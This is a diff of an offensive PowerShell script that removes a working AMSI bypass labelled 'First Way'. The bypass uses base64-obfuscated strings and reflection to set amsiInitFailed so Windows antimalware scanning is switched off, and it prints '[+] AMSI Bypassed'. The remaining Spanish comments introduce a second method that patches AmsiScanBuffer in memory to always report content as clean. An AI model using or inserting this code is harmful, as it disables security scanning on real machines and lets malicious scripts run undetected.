@@ -1,21 +1,3 @@
-#First Way
-
-function base64d{
-    param($encoded)
-    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
-    return $decoded
-}
-
-$A = base64d("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
-$B = base64d("YW1zaUluaXRGYWlsZWQ=")
-$C = base64d("Tm9uUHVibGljLFN0YXRpYw==")
-[Ref].Assembly.GetType($A).GetField($B,$C).SetValue($null,$true)
-Write-Host "[+] AMSI Bypassed"
-
-#######################################################################################################
-
-#Second Way 
-
 # amsi.dll se mapea en la memoria virtual de cada proceso creado AmsiScanBuffer() se usa para detectar la
 # credibilidad del contenido y como tenemos esa funcion mapeada en el espacio de memoria del proceso, podremos
 # forzar a AmsiScanBuffer() para que siempre devuelva AMSI_RESULT_CLEAN
